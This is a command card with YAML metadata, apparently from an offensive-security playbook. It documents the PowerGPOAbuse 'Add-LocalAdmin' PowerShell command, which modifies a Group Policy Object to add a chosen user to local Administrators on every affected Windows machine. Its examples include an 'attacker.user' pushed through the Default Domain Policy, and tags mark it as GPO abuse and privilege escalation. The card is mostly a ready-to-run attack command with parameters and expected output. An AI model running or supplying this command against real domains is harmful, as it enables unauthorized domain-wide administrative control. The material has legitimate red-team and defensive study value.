---
id: 8865e1e3-0cd6-4e33-9298-97c0c7a35a38
name: add-local-admin-gpo
type: command
executor: powershell
data: Add-LocalAdmin -Identity $_USERNAME -GPOIdentity $_GPONAME
output: null
created_at: '2023-04-06T03:56:03.664931+00:00'
updated_at: '2023-10-10T20:26:15.994624+00:00'
platforms:
  - Windows
tags:
  - gpo-abuse
  - privilege-escalation
verified: true
validated: true
---

# add-local-admin-gpo

## Command

```powershell
Add-LocalAdmin -Identity $_USERNAME -GPOIdentity $_GPONAME
```

## Description

This command uses the PowerGPOAbuse module to add a specified user to the local Administrators group via modifications to a target GPO. It is used in Active Directory environments to escalate privileges on all machines affected by the GPO.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -Identity $_USERNAME | The username to add to the local admins group (e.g., 'Bobby') | Yes |
| -GPOIdentity $_GPONAME | The name of the GPO to modify (e.g., 'SuperSecureGPO') | Yes |

## Examples

### Basic Usage

```powershell
Add-LocalAdmin -Identity 'Bobby' -GPOIdentity 'SuperSecureGPO'
```

### Advanced Usage

```powershell
Add-LocalAdmin -Identity 'attacker.user' -GPOIdentity 'Default Domain Policy'
```

## Expected Output

Successful execution produces output like:

"Successfully added 'Bobby' to local Administrators in GPO 'SuperSecureGPO'. Changes will apply on next gpupdate."

If the GPO or user does not exist, an error is returned: "GPO 'SuperSecureGPO' not found."

## Related

- [[procedures/GPO-Abuse-with-PowerGPOAbuse]]
- [[commands/add-user-rights-gpo]]
